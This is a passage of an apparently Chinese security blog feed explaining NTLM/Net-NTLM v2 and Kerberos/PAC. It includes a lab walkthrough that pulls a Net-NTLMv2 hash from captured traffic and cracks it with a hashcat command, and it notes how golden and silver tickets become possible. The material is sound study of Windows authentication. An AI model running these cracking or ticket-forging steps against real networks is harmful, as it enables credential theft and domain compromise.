id="NTLM与NTLM-v1-x2F-v2与Net-NTLM-v1-x2F-v2区别"><a href="#NTLM与NTLM-v1-x2F-v2与Net-NTLM-v1-x2F-v2区别" class="headerlink" title="NTLM与NTLM v1&#x2F;v2与Net NTLM v1&#x2F;v2区别"></a>NTLM与NTLM v1&#x2F;v2与Net NTLM v1&#x2F;v2区别</h2><p>首先是NTLM，就是最上面的那个，例子：<code>AAD3B435B51404EEAAD3B435B51404EE:31D6CFE0D16AE931B73C59D7E0C089C0</code></p><p>而<code>NTLM v1/v2</code>与NTLM不一样，<code>NTLM v1/v2</code>是<code>Net NTLM v1/v2</code>的缩写，也就是说他俩才是一回事。Net NTLM用于网络身份验证，就是上面那个challenge&#x2F;response认证的那个，下面举个NTLM v2的例子，来源<a href="https://hashcat.net/wiki/doku.php?id=example_hashes">hashcat</a>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin::N46iSNekpT:08ca45b7d7ea58ee:88dcbe4446168966a153a0064958dac6:5c7830315c7830310000000000000b45c67103d07d7b95acd12ffa11230e0000000052920b85f78d013c31cdb3b92f5d765c783030 </span><br></pre></td></tr></table></figure><h2 id="NTLM-v1-x2F-v2"><a href="#NTLM-v1-x2F-v2" class="headerlink" title="NTLM v1&#x2F;v2"></a>NTLM v1&#x2F;v2</h2><p>NTLM v2是在Windows NT4.0 SP4中引入的，与NTLM v1的区别是challenge和hash算法不同，相同点是使用的都是NTLM Hash</p><ul><li>challenge<ul><li>NTLM v1：8byte</li><li>NTLM v2：16byte</li></ul></li><li>Net NTLM Hash<ul><li>v1：DES</li><li>v2：HMAC-MD5</li></ul></li></ul><p>NTLM  v1格式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username::hostname:LM response:NTLM response:challenge</span><br></pre></td></tr></table></figure><p>NTML v2格式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username::domain:challenge:HMAC-MD5:blob</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># NTLM</span><br><span class="line"></span><br><span class="line">C = 8-byte server challenge, random</span><br><span class="line">K1 | K2 | K3 = NTLM-Hash | 5-bytes-0</span><br><span class="line">response = DES(K1,C) | DES(K2,C) | DES(K3,C)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># NTLM v2</span><br><span class="line"></span><br><span class="line">SC = 8-byte server challenge, random</span><br><span class="line">CC = 8-byte client challenge, random</span><br><span class="line">CC* = (X, time, CC2, domain name)</span><br><span class="line">v2-Hash = HMAC-MD5(NT-Hash, user name, domain name)</span><br><span class="line">LMv2 = HMAC-MD5(v2-Hash, SC, CC)</span><br><span class="line">NTv2 = HMAC-MD5(v2-Hash, SC, CC*)</span><br><span class="line">response = LMv2 | CC | NTv2 | CC*</span><br></pre></td></tr></table></figure><h2 id="Response提取NTLM-v2"><a href="#Response提取NTLM-v2" class="headerlink" title="Response提取NTLM v2"></a>Response提取NTLM v2</h2><p>这里就不搭建了，使用的<a href="https://3gstudent.github.io/Windows%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81hash-NTLM-hash%E5%92%8CNet-NTLM-hash%E4%BB%8B%E7%BB%8D">3gstudent师傅</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Server</span><br><span class="line">IP:192.168.62.139</span><br><span class="line">username:a</span><br><span class="line">password:test123</span><br><span class="line">Client</span><br><span class="line">IP:192.168.62.130</span><br></pre></td></tr></table></figure><p>客户端连接服务端：</p><p><code>net use \\192.168.52.139 /u:a test123</code></p><p>抓包：</p><p><img src="/2022/05/23/NTML/2-3.png" alt="Alt text"></p><p>前4个对应的就是NTLM认证的几个步骤，第二个查看数据包，其中的challenge：<code>c0b5429111f9c5f4</code></p><p><img src="/2022/05/23/NTML/2-4.png" alt="Alt text"></p><p>查看第三个数据包得到客户端加密的challenge：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">challenge:a9134eee81ca25de</span><br><span class="line"></span><br><span class="line">response:a5f1c47844e5b3b9c6f67736a2e1916d:0101000000000000669dae86ba8bd301a9134eee81ca25de0000000002001e00570049004e002d003100550041004200430047004200470049005500330001001e00570049004e002d003100550041004200430047004200470049005500330004001e00570049004e002d003100550041004200430047004200470049005500330003001e00570049004e002d003100550041004200430047004200470049005500330007000800669dae86ba8bd30106000400020000000800300030000000000000000000000000300000e9d9e613613097d1e2f47c1fd97fa099f65dfd78075d8bdb5ca162492ea5d2990a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00360032002e00310033003900000000000000000000000000</span><br></pre></td></tr></table></figure><p><img src="/2022/05/23/NTML/2-5.png" alt="Alt text"></p><p>其中NTLM v2格式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username::domain:challenge:HMAC-MD5:blob</span><br></pre></td></tr></table></figure><ul><li><p>domain可由数据包获得</p></li><li><p>HMAC-MD5对应数据包中的NTProofStr，见上图。</p></li><li><p>blob对应数据包中Response去掉NTProofStr的后半部分</p></li></ul><p>完整NTLM v2的数据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a::192.168.62.139:c0b5429111f9c5f4:a5f1c47844e5b3b9c6f67736a2e1916d:0101000000000000669dae86ba8bd301a9134eee81ca25de0000000002001e00570049004e002d003100550041004200430047004200470049005500330001001e00570049004e002d003100550041004200430047004200470049005500330004001e00570049004e002d003100550041004200430047004200470049005500330003001e00570049004e002d003100550041004200430047004200470049005500330007000800669dae86ba8bd30106000400020000000800300030000000000000000000000000300000e9d9e613613097d1e2f47c1fd97fa099f65dfd78075d8bdb5ca162492ea5d2990a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00360032002e00310033003900000000000000000000000000</span><br></pre></td></tr></table></figure><p>可以使用Hashcat对该Net-NTLM hash进行破解</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 5600 a::192.168.62.139:c0b5429111f9c5f4:a5f1c47844e5b3b9c6f67736a2e1916d:0101000000000000669dae86ba8bd301a9134eee81ca25de0000000002001e00570049004e002d003100550041004200430047004200470049005500330001001e00570049004e002d003100550041004200430047004200470049005500330004001e00570049004e002d003100550041004200430047004200470049005500330003001e00570049004e002d003100550041004200430047004200470049005500330007000800669dae86ba8bd30106000400020000000800300030000000000000000000000000300000e9d9e613613097d1e2f47c1fd97fa099f65dfd78075d8bdb5ca162492ea5d2990a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00360032002e00310033003900000000000000000000000000 /tmp/password.list -o found.txt --force</span><br></pre></td></tr></table></figure><p>参数：</p><ul><li>-m：hash-type，其中Net NTLM v2对应5600</li><li>-o：输出文件</li><li>-force：强制执行</li></ul><h1 id="SSP-amp-SSPI"><a href="#SSP-amp-SSPI" class="headerlink" title="SSP &amp;SSPI"></a>SSP &amp;SSPI</h1><p><img src="/2022/05/23/NTML/6308e85c-09ca-4a40-9c2b-3e310e1f2a69.jpg" alt="img"></p><p>SSPI(Security Support Provider Interface)：这是 Windows 定义的一套接口，此接口定义了与安全有关的功能函数， 用来获得验证、信息完整性、信息隐私等安全功能，就是定义了一套接口函数用来身份验证，签名等，但是没有具体的实现。</p><p>SSP(Security Support Provider)：SSPI 的实现者，对SSPI相关功能函数的具体实现。微软自己实现了如下的 SSP，用于提供安全功能：</p><ul><li>NTLM SSP ( Challenge&#x2F;Response 验证机制 )</li><li>Kerberos ( 基于 ticket 的身份验证机制 )</li><li>Cred SSP (CredSSP 凭据安全支持提供程序 )</li><li>Digest SSP (摘要式安全支持提供程序)</li><li>Negotiate SSP(协商安全支持提供程序)</li><li>Schannel SSP</li><li>Negotiate Extensions SSP</li><li>PKU2U SSP</li></ul><p>系统层面，SSP其实就是一个dll，来实现身份验证等安全功能。NTLM是基于Challenge&#x2F;Response机制，Kerberos是基于ticket的身份验证。所以，我们也可以实现自己的SSP，让系统实现更多的身份验证方法，Mimikatz就自己实现了一个利用SSP机制的记录密码。</p><p>抓包的时候可以看到啊NTLMSSp是在GSSAPI下面的。</p><blockquote><p>  <strong>因为sspi是gssapi的变体，这里出现gssapi是为了兼容。注册为SSP的好处就是，SSP实现了了与安全有关的功能函数，那上层协议(比如SMB)在进行身份认证等功能的时候，就可以不用考虑协议细节，只需要调用相关的函数即可。而认证过程中的流量嵌入在上层协议里面。不像kerbreos，既可以镶嵌在上层协议里面，也可以作为独立的应用层协议。ntlm是只能镶嵌在上层协议里面，消息的传输依赖于使用ntlm的上层协议。</strong></p></blockquote><h1 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h1><blockquote><p>  <a href="https://daiker.gitbook.io/windows-protocol/ntlm-pian/4">https://daiker.gitbook.io/windows-protocol/ntlm-pian/4</a></p><p>  <a href="https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html">https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html</a></p><p>  <a href="http://davenport.sourceforge.net/ntlm.html">http://davenport.sourceforge.net/ntlm.html</a></p><p>  <a href="https://1sparrow.com/2019/12/04/Windows%20%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/">https://1sparrow.com/2019/12/04/Windows%20%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/</a></p><p>  <a href="https://atsud0.me/2022/03/07/%E3%80%90%E5%9F%9F%E6%B8%97%E9%80%8F%E3%80%91%E6%B5%85%E6%B7%A1NTLM-%E5%86%85%E7%BD%91%E5%B0%8F%E7%99%BD%E7%9A%84NTLM%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">https://atsud0.me/2022/03/07/%E3%80%90%E5%9F%9F%E6%B8%97%E9%80%8F%E3%80%91%E6%B5%85%E6%B7%A1NTLM-%E5%86%85%E7%BD%91%E5%B0%8F%E7%99%BD%E7%9A%84NTLM%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;p&gt;NTLM的东西在github之前写过，但是不够详细，这里重新再过一遍。&lt;/p&gt;
&lt;p&gt;NTLM使用在Windows的工作组环境中，而kerberos则使用在域的情况下。&lt;/p&gt;
&lt;h1 id=&quot;LM-hash-amp-NTLM-hash&quot;&gt;&lt;a h</summary>
      
    
    
    
    <category term="Technology" scheme="https://ghostasky.github.io/categories/Technology/"/>
    
    
    <category term="内网" scheme="https://ghostasky.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>kerberos认证&amp;PAC</title>
    <link href="https://ghostasky.github.io/2022/05/15/%E5%9F%9F%E5%A7%94%E6%B4%BE/"/>
    <id>https://ghostasky.github.io/2022/05/15/%E5%9F%9F%E5%A7%94%E6%B4%BE/</id>
    <published>2022-05-14T16:00:00.000Z</published>
    <updated>2022-07-12T06:22:27.180Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><p>这个是鸽了好久好久的，一直没写，今天补一下。还有域委派的想写一直没写……</p><p>关于详细的可以RFC文档：<a href="https://datatracker.ietf.org/doc/html/rfc4120.html">https://datatracker.ietf.org/doc/html/rfc4120.html</a></p><h1 id="kerveros认证"><a href="#kerveros认证" class="headerlink" title="kerveros认证"></a>kerveros认证</h1><p>由三方来完成：Client,Server,KDC(密钥分发中心)。</p><p>KDC 服务默认会安装在一个域的域控中，而 Client 和 Server 为域内的用户或者是服务，如 HTTP 服务，SQL 服务。在 Kerberos 中 Client 是否有权限访问 Server 端的服务由 KDC 发放的票据来决定。</p><p>KDC由两部分组成：</p><ul><li>AS（<strong>Authentication Server</strong>）：认证服务器，专门用来认证client的身份并发放客户用于访问TGS的TGT（票据授予票据）</li><li>TGS（<strong>Ticket Granting Ticket</strong>）：票据授予服务器，用来发放整个认证过程以及客户端访问服务端时所需的服务授予票据（Ticket）</li></ul><h2 id="认证流程"><a href="#认证流程" class="headerlink" title="认证流程"></a>认证流程</h2><p>先来看一张图：</p><p><img src="/2022/05/15/%E5%9F%9F%E5%A7%94%E6%B4%BE/kerberos5.png" alt="img"></p><p>当 Client 想要访问 Server 上的某个服务时，需要先向 AS 证明自己的身份，然后通过 AS 发放的 TGT 向 Server 发起认证请求，这个过程分为三块：</p><p><strong>The Authentication Service Exchange</strong>：Client 与 AS 的交互；</p><p><strong>The Ticket-Granting Service (TGS) Exchange</strong>：Client 与 TGS 的交互；</p><p><strong>The Client&#x2F;Server Authentication Exchange</strong>：Client 与 Server 的交互。</p><h2 id="Client–AS"><a href="#Client–AS" class="headerlink" title="Client–AS"></a>Client–AS</h2><h3 id="AS-REQ"><a href="#AS-REQ" class="headerlink" title="AS_REQ"></a>AS_REQ</h3><p><code>AS_REQ</code>中的字段在这里可以看到：<a href="https://daiker.gitbook.io/windows-protocol/kerberos/1#0x03-as_req">AS_REQ字段</a></p><p>请求中包含：用户hash加密的时间戳<code>PA-ENC-TIMESTAMP</code>，用户名。</p><p><code>AS_REQ</code>的<code>PA_DATA</code>字段中主要用到的是两个：</p><ol><li><code>PA-ENC-TIMESTAMP</code>：预认证，用户hash加密的时间戳，之后AS有用户的hash，用于解密，获得时间戳，如果时间在一定范围内，则认证通过</li><li><code>PA_PAC_REQUEST</code>：启用PAC支持的扩展，后面会写到。</li></ol><h3 id="AS-REP"><a href="#AS-REP" class="headerlink" title="AS_REP"></a>AS_REP</h3><p>AS向活动目录AD请求查询是否有该用户，有的话取出相应用户对应的Hash，并对 <code>AS_REQ</code> 请求中加密的时间戳<code>PA-ENC-TIMESTAMP</code>进行解密，如果解密成功，则证明客户端提供的密码正确，如果时间戳在五分钟之内，则预认证成功。之后返回TGT票据，分为两部分看下：</p><ol><li><code>ticket</code>字段(TGT)：当前KDC中krbtgt hash加密的TGT票据（<code>Session-key-AS</code>，时间戳，用户信息，到期时间等），在通信数据包中显示的就是<code>ticket</code>字段，<code>ticket</code>字段用于<code>TGS_REQ</code>的认证，是加密的，<strong>用户不可读取里面的内容</strong>。在<code>AS_REQ</code>请求里面时，是使用krbtgt的hash进行加密的，因此如果我们拥有krbtgt的hash就可以自己制作一个ticket，既黄金票据。</li><li><code>enc-part</code>字段：AS会生成一个随机数<code>Session-key-AS</code>（非常重要，作为kerberos中下一轮的认证密钥），使用用户hash加密该字段可以解密，key是用户hash，解密后得到<code>Encryptionkey</code>，其中包含<code>Session-key-AS</code>。</li></ol><p>总的来说AS_REP包含<code>Session-key-AS</code>和<code>TGT</code>（由 krbtgt HASH 加密的 <code>Session-key-AS</code>和时间戳等信息）</p><h3 id="工具导出的票据后缀"><a href="#工具导出的票据后缀" class="headerlink" title="工具导出的票据后缀"></a>工具导出的票据后缀</h3><p>mimikatz，kekeo，rubeus生成的凭据是以<code>.kirbi</code>后缀的。</p><p>impacket 生成的凭据的后缀是<code>.ccache</code>。</p><p>这两种票据主要包含的都是 Session-key 和 TGT，因此可以相互转化。</p><h2 id="Client–TGS"><a href="#Client–TGS" class="headerlink" title="Client–TGS"></a>Client–TGS</h2><h3 id="TGS-REQ"><a href="#TGS-REQ" class="headerlink" title="TGS_REQ"></a>TGS_REQ</h3><p>这里client拿到通过<code>AS_REP</code>拿到TGT，之后访问KDC访问特定服务。</p><p>首先通过用户hash解密<code>AS_REP</code>中<code>enc-part</code>，得到<code>Session-key-AS</code></p><p>Client使用<code>Session-key-AS</code>加密时间戳等信息，得到<code>authenticator</code>（认证符），之后连同<code>AS_REP</code>中的TGT和需要访问的服务ID一起发送给KDC中的TGS。</p><h3 id="TGS-REP"><a href="#TGS-REP" class="headerlink" title="TGS_REP"></a>TGS_REP</h3><p>TGS首先检查是否存在Client访问的服务，若存在，使用krbtgt的hash解密TGT得到<code>Session-key-AS</code>、时间戳等信息，之后使用<code>Session-key-AS</code>解密<code>authenticator</code>部分，将得到的两部分时间戳等信息比较，如果时间相差过大则需要重新认证。</p><p>认证成功TGS会重新生成session，这里称为<code>Session-key-TGS</code>，用于确保客户端与服务器之间通信安全。</p><p>响应为两部分：</p><ol><li><code>Session-key-AS</code>加密的<code>Session-key-TGS</code></li><li>票据ST：server密码的hash加密的<code>Session-key-TGS</code>、时间戳等信息</li></ol><h2 id="Client–Server"><a href="#Client–Server" class="headerlink" title="Client–Server"></a>Client–Server</h2><h3 id="AP-REQ"><a href="#AP-REQ" class="headerlink" title="AP_REQ"></a>AP_REQ</h3><p>客户端收到TGS_REP响应后，使用<code>Session-key-AS</code>解密得到<code>Session-key-TGS</code>。</p><p>请求有两部分：</p><ol><li>新生成的<code>authenticator</code>，包含用户ID、时间戳、Client-info等信息，由<code>Session-key-TGS</code>加密</li><li>票据ST</li></ol><h3 id="AP-REP"><a href="#AP-REP" class="headerlink" title="AP_REP"></a>AP_REP</h3><p>使用server密码的hash解密票据ST，得到<code>Session-key-TGS</code>、时间戳等信息；之后使用<code>Session-key-TGS</code>解密<code>authenticator</code>，得到时间戳等信息，将这两者对比校验。</p><p>通过客户端身份验证后，Server 会拿着 PAC 去询问 DC 该用户是否有访问权限，DC 拿到 PAC 后进行解密，然后通过 PAC 中的 SID 判断用户的用户组信息、用户权限等信息，然后将结果返回给服务端，服务端再将此信息域用户请求的服务资源的 ACL 进行对比，最后决定是否给用户提供相关的服务。通过认证后 Server 将返回最终的 <code>AP-REP</code> 并与 Client 建立通信。</p><h1 id="PAC"><a href="#PAC" class="headerlink" title="PAC"></a>PAC</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>用户特权证书。一般的kerberos流程都是如上所述的，但是这里有个问题，那就是用户有没有权限访问该服务，在上面的流程里面，只要用户的hash正确，那么就可以拿到TGT，有了TGT，就可以拿到TGS，有了TGS，就可以访问服务，任何一个用户都可以访问任何服务。也就是说上面的流程解决了<code>who am i</code>的问题，并没有解决<code>What can I do</code>的问题。</p><p>于是微软引入了PAC，流程变成下面的情况：</p><ol><li><code>AS_REQ</code>：请求为用户hash加密的时间戳，KDC使用用户hash进行解密，如果结果正确返回用krbtgt hash加密的TGT票据，<strong>TGT里面包含PAC,PAC包含用户的sid，用户所在的组</strong>：<code>Ticket[Authorization Data[PAC[Signature]]]</code></li><li>用户凭借TGT票据向KDC发起针对特定服务的TGS_REQ请求，KDC使用krbtgt hash进行解密，如果结果正确，就返回用服务hash 加密的TGS票据(这一步不管用户有没有访问服务的权限，只要TGT正确，就返回TGS票据，任何一个用户，只要hash正确，可以请求域内任何一个服务的TGS票据)</li><li>用户拿着TGS票据去请求服务，服务使用自己的hash解密TGS票据。如果解密正确，就拿着PAC去KDC询问用户有没有访问权限，域控解密PAC。获取用户的sid，以及所在的组，再判断用户是否有访问服务的权限，有访问权限(有些服务并没有验证PAC这一步，这也是白银票据能成功的前提，因为就算拥有用户hash，可以制作TGS，也不能制作PAC，PAC当然也验证不成功，但是有些服务不去验证PAC，这是白银票据成功的前提）就允许用户访问。</li></ol><p>PAC对于用户和服务全程都是不可见的。只有KDC能制作和查看PAC。</p><h2 id="PAC结构"><a href="#PAC结构" class="headerlink" title="PAC结构"></a>PAC结构</h2><blockquote><p>   这里看的daiker师傅的文章。</p></blockquote><p><img src="/2022/05/15/%E5%9F%9F%E5%A7%94%E6%B4%BE/image001.png" alt="img"></p><p>PAC整体上是一个AuthorizationData结构</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">AuthorizationData       ::= SEQUENCE OF SEQUENCE &#123;</span><br><span class="line">              ad-type         [0] Int32,</span><br><span class="line">              ad-data         [1] OCTET STRING</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>其中的ad-type主要有以下几个：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">AD-IF-RELEVANT                     1</span><br><span class="line">AD-INTENDED-FOR-SERVER             2</span><br><span class="line">AD-INTENDED-FOR-APPLICATION-CLASS  3</span><br><span class="line">AD-KDC-ISSUED                      4</span><br><span class="line">AD-AND-OR                          5</span><br><span class="line">AD-MANDATORY-TICKET-EXTENSIONS     6</span><br><span class="line">AD-IN-TICKET-EXTENSIONS            7</span><br><span class="line">AD-MANDATORY-FOR-KDC               8</span><br><span class="line">Reserved values                 9-63</span><br><span class="line">OSF-DCE                           64</span><br><span class="line">SESAME                            65</span><br><span class="line">AD-OSF-DCE-PKI-CERTID             66 (hemsath @us.ibm.com)</span><br><span class="line">AD-WIN2K-PAC                     128 (jbrezak @exchange.microsoft.com)</span><br><span class="line">AD-ETYPE-NEGOTIATION             129  (lzhu @windows.microsoft.com)</span><br></pre></td></tr></table></figure><p>整个PAC最外层的<code>ad-type</code>为<code>AD-IF-RELEVANT</code>，封装了另一个 <code>AD-WIN2K-PAC</code> 类型的 <code>AuthorizationData</code> 元素，结构为<a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/6655b92f-ab06-490b-845d-037e6987275f">PACTYPE</a></p><p>，意思就是这个<code>AuthorizationData</code>元素的<code>ad-type</code>为<code>AD-WIN2K-PAC</code>，而<code>ad-data</code>为一段连续的空间，结构为<a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/3341cfa2-6ef5-42e0-b7bc-4544884bf399">PAC_INFO_BUFFER</a></p><p>PACTYPE结构：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">PACTYPE</span> &#123;</span></span><br><span class="line">    ULONG cBuffers;<span class="comment">//用于定义Buffers 数组中的条目数。</span></span><br><span class="line">    ULONG Version;<span class="comment">//定义 PAC 版本的小端格式的 32 位无符号整数；必须是 0x00000000。</span></span><br><span class="line">    PAC_INFO_BUFFER Buffers[<span class="number">1</span>];<span class="comment">//PAC_INFO_BUFFER 结构的数组</span></span><br><span class="line">&#125; PACTYPE, *PPACTYPE;</span><br></pre></td></tr></table></figure><p>PAC_INFO_BUFFER结构(key-value型)：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">PAC_INFO_BUFFER</span> &#123;</span></span><br><span class="line">    ULONG ulType;<span class="comment">//描述存在于Offset处的缓冲区中的数据类型</span></span><br><span class="line">    ULONG cbBufferSize;<span class="comment">//包含 PAC 中位于Offset的缓冲区的大小（以字节为单位）</span></span><br><span class="line">    ULONG64 Offset;<span class="comment">//包含从 PACTYPE 结构开头到缓冲区开头的偏移量，以字节为单位。数据偏移量必须是八的倍数。以下部分指定每种元素的格式</span></span><br><span class="line">&#125; PAC_INFO_BUFFER, *PPAC_INFO_BUFFER;</span><br></pre></td></tr></table></figure><p>key的类型：</p><table><thead><tr><th align="left">类型</th><th align="left">意义</th></tr></thead><tbody><tr><td align="left">0x00000001</td><td align="left">登录信息。PAC 结构必须包含一个这种类型的缓冲区。必须忽略其他登录信息缓冲区。</td></tr><tr><td align="left">0x00000002</td><td align="left">凭证信息。PAC 结构不应包含多个此类缓冲区。第二个或后续的凭证信息缓冲区在接收时必须被忽略。</td></tr><tr><td align="left">0x00000006</td><td align="left">服务器校验和。PAC 结构必须包含一个这种类型的缓冲区。必须忽略其他登录服务器校验和缓冲区。</td></tr><tr><td align="left">0x00000007</td><td align="left">KDC（特权服务器）校验和。PAC 结构必须包含一个这种类型的缓冲区。必须忽略额外的 KDC 校验和缓冲区。</td></tr><tr><td align="left">0x0000000A</td><td align="left">客户名称和票证信息。PAC 结构必须包含一个这种类型的缓冲区。必须忽略其他客户端和票证信息缓冲区。</td></tr><tr><td align="left">0x0000000B</td><td align="left">受约束的委派信息。PAC 结构必须包含一个用于用户到代理服务 (S4U2proxy) 请求的此类缓冲区，否则不包含。必须忽略其他受约束的委托信息缓冲区。</td></tr><tr><td align="left">0x0000000C</td><td align="left">用户主体名称 (UPN) 和域名系统 (DNS) 信息。PAC 结构不应该包含多个此类型的缓冲区。第二个或后续的 UPN 和 DNS 信息缓冲区在接收时必须被忽略。</td></tr><tr><td align="left">0x0000000D</td><td align="left">客户索赔信息。PAC 结构不应该包含多个此类缓冲区。必须忽略其他客户端声明信息缓冲区。</td></tr><tr><td align="left">0x0000000E</td><td align="left">设备信息。PAC 结构不应该包含多个此类缓冲区。必须忽略其他设备信息缓冲区。</td></tr><tr><td align="left">0x0000000F</td><td align="left">设备声明信息。PAC 结构不应该包含多个此类型的缓冲区。必须忽略其他设备声明信息缓冲区。</td></tr><tr><td align="left">0x00000010</td><td align="left">票证校验和。PAC 结构不应包含多个此类缓冲区。必须忽略额外的票据校验和缓冲区。</td></tr><tr><td align="left">0x00000011</td><td align="left">PAC Attributes 指示缓冲区包含 PAC 的属性位。PAC 结构不应包含多个此类缓冲区。必须忽略其他属性缓冲区。</td></tr><tr><td align="left">0x00000012</td><td align="left">PAC 请求者指示缓冲区包含请求 PAC 的主体的 SID。PAC 结构必须包含一个这种类型的缓冲区。</td></tr></tbody></table><p>说几个重要的：</p><ul><li><p>0x00000001：KERB_VALIDATION_INFO，登陆信息，是一个结构体，整个PAC最重要的部分，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">KERB_VALIDATION_INFO</span> &#123;</span></span><br><span class="line">   FILETIME LogonTime;</span><br><span class="line">   FILETIME LogoffTime;</span><br><span class="line">   FILETIME KickOffTime;</span><br><span class="line">   FILETIME PasswordLastSet;</span><br><span class="line">   FILETIME PasswordCanChange;</span><br><span class="line">   FILETIME PasswordMustChange;</span><br><span class="line">   RPC_UNICODE_STRING EffectiveName;</span><br><span class="line">   RPC_UNICODE_STRING FullName;</span><br><span class="line">   RPC_UNICODE_STRING LogonScript;</span><br><span class="line">   RPC_UNICODE_STRING ProfilePath;</span><br><span class="line">   RPC_UNICODE_STRING HomeDirectory;</span><br><span class="line">   RPC_UNICODE_STRING HomeDirectoryDrive;</span><br><span class="line">   USHORT LogonCount;</span><br><span class="line">   USHORT BadPasswordCount;</span><br><span class="line">   ULONG UserId;</span><br><span class="line">   ULONG PrimaryGroupId;</span><br><span class="line">   ULONG GroupCount;</span><br><span class="line">   [size_is(GroupCount)] PGROUP_MEMBERSHIP GroupIds;</span><br><span class="line">   ULONG UserFlags;</span><br><span class="line">   USER_SESSION_KEY UserSessionKey;</span><br><span class="line">   RPC_UNICODE_STRING LogonServer;</span><br><span class="line">   RPC_UNICODE_STRING LogonDomainName;</span><br><span class="line">   PISID LogonDomainId;</span><br><span class="line">   ULONG Reserved1[<span class="number">2</span>];</span><br><span class="line">   ULONG UserAccountControl;</span><br><span class="line">   ULONG SubAuthStatus;</span><br><span class="line">   FILETIME LastSuccessfulILogon;</span><br><span class="line">   FILETIME LastFailedILogon;</span><br><span class="line">   ULONG FailedILogonCount;</span><br><span class="line">   ULONG Reserved3;</span><br><span class="line">   ULONG SidCount;</span><br><span class="line">   [size_is(SidCount)] PKERB_SID_AND_ATTRIBUTES ExtraSids;</span><br><span class="line">   PISID 